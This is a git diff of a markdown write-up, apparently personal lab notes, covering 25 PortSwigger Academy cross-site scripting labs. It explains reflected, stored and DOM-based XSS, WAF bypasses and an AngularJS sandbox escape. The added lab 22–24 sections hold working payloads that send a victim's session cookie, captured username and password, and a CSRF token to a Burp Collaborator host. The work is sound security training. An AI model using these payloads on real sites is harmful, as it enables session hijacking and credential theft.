@@ -1,6 +1,6 @@
 # Cross-Site Scripting (XSS) (Labs: Portswigger Academy)
 
-### Theroy
+## Little Refresher
 
 There are three main types of XSS attacks. These are:
 
@@ -8,11 +8,11 @@ There are three main types of XSS attacks. These are:
 * [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
 * [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.
 
-### Labs from PortSwigger Academy
+## Labs from PortSwigger Academy
 
 🟩🟩APPRENTICE LAB🟩🟩
 
-#### Lab 1: Reflected XSS into HTML context with nothing encoded
+### Lab 1: Reflected XSS into HTML context with nothing encoded
 
 This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
 
@@ -36,10 +36,16 @@ xss payload
 page source:
 
 ```html
-<h1>0 search results for '<script>alert(0)</script>'</h1>
+<h1>
+  0 search results for '
+  <script>
+    alert(0);
+  </script>
+  '
+</h1>
 ```
 
-#### Lab 2: Stored XSS into HTML context with nothing encoded
+### Lab 2: Stored XSS into HTML context with nothing encoded
 
 This lab contains a stored cross-site scripting vulnerability in the comment functionality.
 
@@ -94,15 +100,20 @@ page source:
 
 ```html
 <section class="comment">
-                        <p>
-                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            &lt;thisisname&gt; | 29 October 2025
-                        </p>
-                        <p><script>alert(0)</script></p>
-                        <p></p>
-                    </section>
+  <p>
+    <img src="/resources/images/avatarDefault.svg" class="avatar" />
+    &lt;thisisname&gt; | 29 October 2025
+  </p>
+  <p>
+    <script>
+      alert(0);
+    </script>
+  </p>
+  <p></p>
+</section>
 ```
 
-#### Lab 3: DOM XSS in document.write sink using source location.search
+### Lab 3: DOM XSS in document.write sink using source location.search
 
 This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
 
@@ -117,10 +128,10 @@ https://0a63001e04a7ce8981929d79001c00da.web-security-academy.net/?search=<sushi
 The passed value is used in two places.
 
 ```html
-<section class=blog-header>
-                        <h1>1 search results for '&lt;sushil&gt;'</h1>
-                        <hr>
-                    </section>
+<section class="blog-header">
+  <h1>1 search results for '&lt;sushil&gt;'</h1>
+  <hr />
+</section>
 ```
 
 * properly encoded here.
@@ -159,7 +170,7 @@ this makes the final implemented script as:
 <img src="/resources/images/tracker.gif?searchTerms=" onload=alert(1)><"">
 ```
 
-#### Lab 4: DOM XSS in innerHTML sink using source location.search
+### Lab 4: DOM XSS in innerHTML sink using source location.search
 
 This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
 
@@ -195,7 +206,8 @@ explaination:
 In conclusion, what ever is passed in to search query, it is passed and filled inside span tag.
 
 ```html
-<span>1 search results for '</span><span id="searchMessage">hello</span><span>'</span>
+<span>1 search results for '</span><span id="searchMessage">hello</span
+><span>'</span>
 ```
 
 XSS payload for span tag.
@@ -206,7 +218,7 @@ XSS payload for span tag.
 
 `<script>alert(0)</script>` **will NOT work** when injected into a `<span>` via innerHTML.
 
-#### Lab 5: DOM XSS in jQuery anchor href attribute sink using location.search source
+### Lab 5: DOM XSS in jQuery anchor href attribute sink using location.search source
 
 This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.
 
@@ -215,10 +227,10 @@ To solve this lab, make the "back" link alert `document.cookie`.
 vulnerable code:
 
 ```js
-<script> 
-	$(function() { 
-		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); 
-	}); 
+<script>
+	$(function() {
+		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+	});
 </script>
 ```
 
@@ -238,13 +250,15 @@ after: `<a id="backLink" href="/">Back</a>`
 xss payload:
 
 ```js
-javascript:alert(document.cookie)
+javascript: alert(document.cookie);
 ```
 
 final form of html after xss injection.
 
 ```js
-<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
+<a id="backLink" href="javascript:alert(document.cookie)">
+  Back
+</a>
 ```
 
 Why `"</a> <script>alert(0)</script><"` wont work.
@@ -253,7 +267,7 @@ Why `"</a> <script>alert(0)</script><"` wont work.
 * You are setting the **href attribute**
 * So the browser treats your payload as a **URL**, not HTML
 
-#### Lab 6: DOM XSS in jQuery selector sink using a hashchange event
+### Lab 6: DOM XSS in jQuery selector sink using a hashchange event
 
 This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.
 
@@ -266,7 +280,7 @@ vulnerable code:
     $(window).on('hashchange', function() {
         var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
         if (post) post.get(0).scrollIntoView();
-    });    
+    });
 </script>
 
 ```
@@ -337,11 +351,13 @@ how this payload works.
 For the xss payload to trigger there need to be hashchange. For victim this can be achieved using iframe
 
 ```js
-<iframe src="https://0a1d00ed04e0bca48155436000970031.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-
+<iframe
+  src="https://0a1d00ed04e0bca48155436000970031.web-security-academy.net/#"
+  onload="this.src+='<img src=x onerror=print()>'"
+></iframe>
 ```
 
-#### Lab 7: Reflected XSS into attribute with angle brackets HTML-encoded
+### Lab 7: Reflected XSS into attribute with angle brackets HTML-encoded
 
 This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.
 
@@ -373,16 +389,16 @@ XSS payload by introducing new attribute.
 " onfocus="alert(1)
 
 or
-" onfocus="alert(1)" autofocus" 
+" onfocus="alert(1)" autofocus"
 
 or
 "onmouseover="alert(1)
 
 ```
 
-<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (55).png>)
 
-#### Lab 8: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+### Lab 8: Stored XSS into anchor `href` attribute with double quotes HTML-encoded
 
 This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
 
@@ -390,13 +406,17 @@ vulnerable point.
 
 ```html
 <section class="comment">
-                        <p>
-                        <img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="http://<&quot;thisiswebsite&quot;>.com">&lt;&quot;thisisname&quot;&gt;</a> 
-                        | 29 October 2025
-                        </p>
-                        <p>&lt;&quot;thisiscomment&quot;&gt;</p>
-                        <p></p>
-                    </section>
+  <p>
+    <img src="/resources/images/avatarDefault.svg" class="avatar" /><a
+      id="author"
+      href='http://<"thisiswebsite">.com'
+      >&lt;&quot;thisisname&quot;&gt;</a
+    >
+    | 29 October 2025
+  </p>
+  <p>&lt;&quot;thisiscomment&quot;&gt;</p>
+  <p></p>
+</section>
 ```
 
 passed website url's `"` is HTML-encoded
@@ -409,15 +429,20 @@ javascript:alert()
 
 ```html
 <section class="comment">
-                        <p>
-<img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="javascript:alert()">asdfas</a> | 29 October 2025
-                        </p>
-                        <p>a</p>
-                        <p></p>
-                    </section>
+  <p>
+    <img src="/resources/images/avatarDefault.svg" class="avatar" /><a
+      id="author"
+      href="javascript:alert()"
+      >asdfas</a
+    >
+    | 29 October 2025
+  </p>
+  <p>a</p>
+  <p></p>
+</section>
 ```
 
-#### Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+### Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
 This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
 
@@ -470,7 +495,7 @@ other payload
 
 🟦🟦PRACTITIONER LABS🟦🟦
 
-#### Lab 10: DOM XSS in document.write sink using source location.search inside a select element
+### Lab 10: DOM XSS in document.write sink using source location.search inside a select element
 
 This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.
 
@@ -479,23 +504,17 @@ To solve this lab, perform a cross-site scripting attack that breaks out of the 
 Vulnerable Code:
 
 ```html
-< script >
-    var stores = ["London", "Paris", "Milan"];
-var store = (new URLSearchParams(window.location.search)).get('storeId');
-
-
-document.write('<select name="storeId">');
-if (store) {
-    document.write('<option selected>' + store + '</option>');
-}
-for (var i = 0; i < stores.length; i++) {
-    if (stores[i] === store) {
-        continue;
-    }
-    document.write('<option>' + stores[i] + '</option>');
-}
-document.write('</select>'); <
-/script>
+< script > var stores = ["London", "Paris", "Milan"]; var store = (new
+URLSearchParams(window.location.search)).get('storeId'); document.write('<select
+  name="storeId"
+>
+  '); if (store) { document.write('
+  <option selected>' + store + '</option>
+  '); } for (var i = 0; i < stores.length; i++) { if (stores[i] === store) {
+  continue; } document.write('
+  <option>' + stores[i] + '</option>
+  '); } document.write('</select
+>'); < /script>
 ```
 
 code explanation:
@@ -543,7 +562,7 @@ In URL:
 https://0ae70062046081df801da8be005000b8.web-security-academy.net/product?productId=17&storeId=<script>alert('XSS')</script>
 ```
 
-#### Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+### Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
 This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
 
@@ -551,7 +570,7 @@ AngularJS is a popular JavaScript library, which scans the contents of HTML node
 
 To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.
 
-<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (56).png>)
 
 keythings
 
@@ -561,7 +580,7 @@ keythings
 
 for example:
 
-<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (57).png>)
 
 but we cannot use `{{alert()}} or {{print()}}` because angularJS javascript sandbox doesnot give us access to these type of functions with in double curly braces.
 
@@ -573,29 +592,27 @@ XSS payload:
 
 Watch this to better understand: [https://youtu.be/P7\_JPsX1ses](https://youtu.be/P7_JPsX1ses)
 
-#### Lab 12: Reflected DOM XSS
+### Lab 12: Reflected DOM XSS
 
 This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
 
 To solve this lab, create an injection that calls the `alert()` function.
 
-<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (58).png>)
 
-there is use of `searchResults.js`&#x20;
+there is use of `searchResults.js` viewing the js file reveals the use of eval function
 
-viewing the js file reveals the use of eval function
-
-<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (59).png>)
 
 after we do search, there exits additional request which gives json response
 
-<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (60).png>)
 
 combining everything.
 
 from the request `/search-results?search=sushil` the response value `searchTerm` is passed onto the `eval` function of `searchResults.js`
 
-<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (61).png>)
 
 JSON response is escaping `"`
 
@@ -607,15 +624,15 @@ eval('var searchResultsObj = "test"; alert(0);');
 
 so we need a way to escape the `" "`
 
-<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (62).png>)
 
 `"` is escaped
 
-<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (63).png>)
 
 `\ is escaping \` so `"` is free
 
-<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/unknown (64).png>)
 
 XSS Payload
 
@@ -623,7 +640,7 @@ XSS Payload
 \" };alert(0);//
 ```
 
-#### Lab 13: Stored DOM XSS
+### Lab 13: Stored DOM XSS
 
 This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.
 
@@ -634,19 +651,685 @@ XSS Payload:
 
 ```
 
-![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030183919.png?1761828859598)
+![](<../.gitbook/assets/unknown (65).png>)
 
 Actual method:
 
 * there exist `resources/js/loadCommentsWithVulnerableEscapeHtml.js`
-* this js file is responsible for HTML encoding `<`and `>`![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030184109.png?1761828969124)
+* this js file is responsible for HTML encoding `<`and `>`
 
-![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030184149.png?1761829009475)
+![](<../.gitbook/assets/unknown (66).png>)
 
-there exist a loophole, it only encodes the 1st instances of the angle brackets![](app://0b9390a0ba76fd1f8c63f5d0d851f87a30f6/C:/Users/dolla/OneDrive/Obsidian/The%20Brain/08%20-%20Archive/01%20-%20Attachments/Pasted%20image%2020251030184252.png?1761829072067)
+![](<../.gitbook/assets/unknown (67).png>)
+
+there exist a loophole, it only encodes the 1st instances of the angle brackets
+
+![](<../.gitbook/assets/unknown (68).png>)
 
 which means, we can use this payload to get xss
 
 ```
-1<><img src=1 onerror=alert(1)>
+<><img src=1 onerror=alert(1)>
+```
+
+### Lab 14: Reflected XSS into HTML context with most tags and attributes blocked
+
+This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
+
+To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.
+
+when trying common xss payloads it gives Tag is not allowed.
+
+```
+<img src=1 onerror=print()>
+```
+
+![](<../.gitbook/assets/unknown (69).png>)
+
+![](<../.gitbook/assets/unknown (70).png>)
+
+lets bruteforce the tags. [Get tags from here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+![](<../.gitbook/assets/unknown (71).png>)
+
+![](<../.gitbook/assets/unknown (72).png>)
+
+two tags `<body>` and `<custom tags>` are allowed
+
+lets move on with `<body>` tag. next step is to find which events are allowed
+
+![](<../.gitbook/assets/unknown (73).png>)
+
+![](<../.gitbook/assets/unknown (74).png>)
+
+there a lot of allowed events. since we need to trigger xss without victim's interaction, we need to choose proper event tag. `onresize` looks easy one.
+
+XSS payload
+
+```
+<iframe src="https://0af1006103fd822580ec5d9000b100a4.web-security-academy.net/?search=<body onresize='print()'>" onload=this.style.width='500px'>
+```
+
+### Lab 15: Reflected XSS into HTML context with all tags blocked except custom ones
+
+This lab blocks all HTML tags except custom ones.
+
+To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.
+
+same as previous lab. only difference is all tags are blocked except custom ones.
+
+XSS Payload
+
+```
+<script>
+lcoation = "https://0a6000590315195c81f8d93500c900a7.web-security-academy.net/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
+</script>
+```
+
+* `location = "..."` is a **special assignment** in JavaScript that **immediately redirects** the browser to the given URL.
+
+### Lab 16: Reflected XSS with some SVG markup allowed
+
+This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
+
+To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.
+
+Same as previous 2 labs:
+
+allowed tags:
+
+![](<../.gitbook/assets/unknown (75).png>)
+
+working xss payload;
+
+```
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+```
+
+### Lab 17: Reflected XSS in canonical link tag
+
+This lab reflects user input in a canonical link tag and escapes angle brackets.
+
+To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.
+
+To assist with your exploit, you can assume that the simulated user will press the following key combinations:
+
+* `ALT+SHIFT+X`
+* `CTRL+ALT+X`
+* `Alt+X`
+
+Please note that the intended solution to this lab is only possible in Chrome.
+
+A canonical tag (also known as a rel="canonical" link tag) is an HTML element used in the `<head>` section of a webpage to specify the preferred (canonical) version of a page when multiple URLs display the same or nearly identical content. Syntax:
+
+```html
+<link rel="canonical" href="https://example.com/preferred-page-url" />
+```
+
+**Example Scenario**
+
+You have the same product page accessible via multiple URLs:
+
+* `https://example.com/shoes/nike-air`
+* `https://example.com/shoes/nike-air?color=red`
+* `https://example.com/shoes/nike-air?utm_source=newsletter` This tells Google: _"Index and rank the clean URL, ignore the others."_
+
+![](<../.gitbook/assets/unknown (76).png>)
+
+XSS Payload
+
+```
+https://0ada0095031f629782ab3fb8001d003f.web-security-academy.net/?sushil=test%27%09onclick=%27alert(1)%27%09accesskey=%27x%27
+```
+
+* space was url encoded so url encoded version of new line `%09` is used
+
+The link tag becomes
+
+![](<../.gitbook/assets/unknown (77).png>)
+
+### Lab 18: Reflected XSS into a JavaScript string with single quote and backslash escaped
+
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
+
+lets say we search query is `<sushil>`, it is reflected as
+
+![](<../.gitbook/assets/unknown (78).png>)
+
+when `';alert(0);` is supplied, `'` is escaped
+
+![](<../.gitbook/assets/unknown (79).png>)
+
+XSS Payload
+
+```
+</script><script> alert() </script>
+```
+
+![](<../.gitbook/assets/unknown (80).png>)
+
+### Lab 19: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
+
+Findings
+
+* Angle brackets --> HTML encoded
+* Double quotes --> HTML encoded
+* Single quotes --> Escaped
+
+![](<../.gitbook/assets/unknown (81).png>)
+
+for search query `<'sushil'>` angle brackets are encoded and `'` are escaped.
+
+XSS Payload
+
+```
+\';alert(0);//
+```
+
+![](<../.gitbook/assets/unknown (82).png>)
+
+### Lab 20: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+This lab contains a stored cross-site scripting vulnerability in the comment functionality.
+
+To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
+
+![](<../.gitbook/assets/unknown (83).png>)
+
+we are interested in `onclick` portion
+
+```
+onclick="var tracker={track(){}};tracker.track('http://&lt;&quot;thisiswebsite&quot;&gt;.com');"
+```
+
+trying to make this
+
+```
+onclick="var tracker={track(){}};tracker.track('http://test'-alert(0)-'');"
+```
+
+due to encoding and escaping, it becomes
+
+![](<../.gitbook/assets/unknown (84).png>)
+
+```
+onclick="var tracker={track(){}};tracker.track('http://test\'-alert(0)-\'');"
+```
+
+trying additional `\` to bypass `'` escape fails.
+
+![](<../.gitbook/assets/unknown (85).png>)
+
+lets bypass `'`escape using its HTML entity version
+
+`'` --> HTML Entity --> `&apos;`
+
+XSS PAYLOAD
+
+```
+http://test&apos;-alert(0)-&apos;
+```
+
+![](<../.gitbook/assets/unknown (86).png>)
+
+![](<../.gitbook/assets/unknown (87).png>)
+
+lets understand the flow of xss
+
+after injection:
+
+```
+onclick="var tracker={track(){}}; tracker.track('http://test'-alert(0)-'');"
+```
+
+| Part            | What Happens                                             |
+| --------------- | -------------------------------------------------------- |
+| `'http://test'` | → String                                                 |
+| `-`             | → **Subtraction operator**                               |
+| `alert(0)`      | → **Runs immediately**, shows popup, returns `undefined` |
+| `-`             | → Another subtraction                                    |
+| `''`            | → Empty string → `0` in math                             |
+
+Why this works: The key trick
+
+| Trick                              | Why It Works                                                    |
+| ---------------------------------- | --------------------------------------------------------------- |
+| **`-alert(0)-`**                   | Uses **mathematical subtraction** to **inject executable code** |
+| **No need to close quotes**        | You're already **inside a string** — `'` is just a character    |
+| **`alert(0)` returns `undefined`** | Perfect for math: `string - undefined = NaN` → no error         |
+| **No syntax break**                | The expression is **grammatically valid JS**                    |
+
+```
+tracker.track(  'http://test'  -  alert(0)  -  ''  );
+                ↑             ↑   ↑         ↑   ↑
+                |             |   |         |   |
+           String literal   |  Runs!    |  Empty string → 0
+                            |           |
+                     Subtraction     Subtraction
+```
+
+### Lab 21: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.
+
+![](<../.gitbook/assets/unknown (88).png>)
+
+search query is passed with unicode escaped.
+
+* string has been reflected inside a JavaScript template string.
+
+First lets understand `` ` `` Template Literals in JavaScript
+
+**Basic Syntax**
+
+| Type               | Example                  | Result                              |
+| ------------------ | ------------------------ | ----------------------------------- |
+| **Regular string** | `` `Hello World` ``      | `"Hello World"`                     |
+| **With variables** | `` `Hello ${name}` ``    | `"Hello John"` (if `name = "John"`) |
+| **Multi-line**     | `` `Line 1<br>Line 2` `` | `"Line 1\nLine 2"`                  |
+
+**Expression Interpolation**
+
+| Example                                      | Result                                       |
+| -------------------------------------------- | -------------------------------------------- |
+| `` `2 + 2 = ${2 + 2}` ``                     | `"2 + 2 = 4"`                                |
+| `` `User: ${user.name}, Age: ${user.age}` `` | `"User: John, Age: 30"`                      |
+| `` `Price: ${price * quantity}` ``           | `"Price: $150"`                              |
+| `` `${alert('XSS!')}` ``                     | **Runs `alert()` and returns `"undefined"`** |
+
+XSS Payload
+
+```
+${alert(0)}
+```
+
+![](<../.gitbook/assets/unknown (89).png>)
+
+### Lab 22: Exploiting cross-site scripting to steal cookies
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
+
+Finding out the XSS vuln:
+
+![](<../.gitbook/assets/unknown (90).png>)
+
+user supplied data are passed as above. comment section look vulnerable.
+
+XSS Payload.
+
+```
+</p><script>alert(0)</script><p>
+```
+
+![](<../.gitbook/assets/unknown (91).png>)
+
+now editing the xss payload to capture cookie.
+
+```
+</p><script>fetch('https://0abnouxdqdlez91tdv4pwntpmgs7gx4m.oastify.com/?cookie='+document.cookie);</script><p>
+```
+
+In Collaborator, we will receive session cookie like this:
+
+![](<../.gitbook/assets/unknown (92).png>)
+
+use that cookie and we are logged in.
+
+### Lab 23: Exploiting cross-site scripting to capture passwords
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
+
+![](<../.gitbook/assets/unknown (93).png>)
+
+same as before, xss vulnerable field = comment
+
+checking xss;
+
+```
+</p><script>alert(0)</script><p>
+```
+
+editing payload to capture password. previous cookie stealing method wont work here.
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://0abnouxdqdlez91tdv4pwntpmgs7gx4m.oastify.com',
+{
+	method:'POST',
+	mode: 'no-cors',
+	body:username.value+':'+this.value
+});">
+```
+
+Explanation:
+
+* we are setting up username and password fields.
+* `onchange` --> js runs when the password field loses focus(after typing)
+* `if(this.value.lenght` --> checks if the password value is empty or not. if not then moves to next step.
+* `fetch` --> sends post request to out controlled server
+* `no-cors` --> is making this request send to attacker site and not care or not take the response of that request
+* `body:username.value+':'+this.value` --> Sends: `username:password`
+
+after commenting, we get this:
+
+![](<../.gitbook/assets/unknown (94).png>)
+
+username and password fields.
+
+and we should get username:password in collaborator request:
+
+![](<../.gitbook/assets/unknown (95).png>)
+
+### Lab 24: Exploiting XSS to bypass CSRF defenses
+
+This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.
+
+You can log in to your own account using the following credentials: `wiener:peter`
+
+* Same as before, Comment is vulnerable to XSS. Session is set as `HttpOnly` true so we cannot steal the cookie.
+
+Checkout my notes on [CSRF](https://dollarboysushil.com/posts/Web-Application-Cross-Site-Request-Forgery-\(CSRF\)-Vulnerabilites/) if you are new.
+
+request for changing email:
+
+```
+POST /my-account/change-email HTTP/2
+Host: 0afa004d03ce83c7800b03bf00aa0072.web-security-academy.net
+Cookie: session=lD9Fi6vNWkeKAZCoIpPj4hmokXatZWxW
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0
+
+
+email=test%40gmail.com&csrf=1gZODqCRyGfJjXEpO36lSnYPWtlEhZFX
+```
+
+Now we need to think of a way to get the csrf token.
+
+![](<../.gitbook/assets/unknown (96).png>)
+
+csrf token is present in `/my-account` endpoint
+
+lets craft a simple xss payload that fetches /my-account and extracts the csrf token and sends to our controlled site (burp collaborator)
+
+```
+<script>
+fetch('https://0afa004d03ce83c7800b03bf00aa0072.web-security-academy.net/my-account')
+  .then(r => r.text())
+  .then(html => {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    const csrf = doc.querySelector('input[name="csrf"]').value;
+
+    fetch('https://110ofvoehecfqasu4wvqnokqdhj870vp.oastify.com/steal', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: 'csrf=' + encodeURIComponent(csrf)
+    });
+  });
+</script>
+```
+
+![](<../.gitbook/assets/unknown (97).png>)
+
+got the csrf. Now using burpsuite > Engagement Tool > generate csrf poc
+
+![](<../.gitbook/assets/unknown (98).png>)
+
+```
+
+
+  <body>
+    <form action="https://0afa004d03ce83c7800b03bf00aa0072.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="dollarboysushil&#64;gmail&#46;com" />
+      <input type="hidden" name="csrf" value="DHcbjCQ1IPac9oNtv3ixyLseyvFQ1Nns" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+
+
+```
+
+paste this into comment.
+
+![](<../.gitbook/assets/unknown (99).png>)
+
+### Lab 25: Reflected XSS with AngularJS sandbox escape without strings
+
+This lab uses AngularJS in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.
+
+![](<../.gitbook/assets/unknown (100).png>)
+
+Passed search query `<"sushil">` is interpreted as above.
+
+```html
+<script>
+  angular
+    .module("labApp", [])
+    .controller("vulnCtrl", function ($scope, $parse) {
+      $scope.query = {};
+      var key = "search";
+      $scope.query[key] = "&lt;&quot;sushil&quot;&gt;";
+      $scope.value = $parse(key)($scope.query);
+    });
+</script>
+```
+
+Easy explanation of the code:
+
+* It creates a box (`$scope.query`) to hold data.
+* It puts a **dangerous string** (<"sushil">) into that box under the name search.
+* Then it **reads that value back** using `$parse`. **What is $parse?**
+* $parse is like a **magic reader**.
+* It can **read values** from objects **or even run code** if the input is tricky.
+* Normally safe... but **can be abused**.
+
+```
+$parse(key)($scope.query)
+```
+
+→ This says: **"Run whatever key is as an expression!"**
+
+| If `key` is...                     | Then `$parse(key)(...)` does...  |
+| ---------------------------------- | -------------------------------- |
+| `'search'`                         | Gets the value of `query.search` |
+| `'user.name'`                      | Gets `query.user.name`           |
+| **`'search + $eval("alert(1)")'`** | **Runs `alert(1)`!**             |
+
+Working payload from [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-\(without-strings\)).
+
+```
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+```
+
+explanation of code:\
+PART 1:
+
+* `toString().constructor.prototype.charAt = [].join;`
+  * `.charAt` A method that gets a character from a string
+  * `=[].join` join = turns array into string `(like [a,b] → "a,b")`
+  * This piece of code replaces `charAt` with `join`, now when something calls `.charAt()`, it actually runs `.join()`
+
+In angular js sandbox, input is checked using `.charAt` , breaking whole input into character. Each character is checked if its malicious or not. Using above function, we are effectively destroying the checking function.
+
+PART 2:
+
+* `[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
+  * `orderBy` can run a function (eg: `alert(0))`
+  * `fromCharCode(120,61,97,108,101,114,116,40,49,41)` --> the numbers here are decimal representation of `x=alert(1)`, so `fromCharCode` function if converting decimal to ascii
+
+**Final Magic (How It Becomes alert(1))**
+
+* `toString().constructor` → Function
+* `.fromCharCode(...)` → builds string: `"x=alert(1)"`
+* `orderBy` tries to sort `[1,2]` → calls `.charAt` on each
+* But `.charAt` is now .join → so it **joins** the array
+* Angular sees `x=alert(1`) → assigns `x = alert(1)`
+* `x()` → runs `alert(1`) → **POPUP**
+
+_Works Only In:_
+
+* **AngularJS < 1.6** (sandbox was removed in 1.6+)
+
+FURTHER TESTING
+
+![](<../.gitbook/assets/unknown (101).png>)
+
+`?search=1&2%2b2=1` --> `?search=1&2+2=1` <-->`(%2b = +)( url decoded)`
+
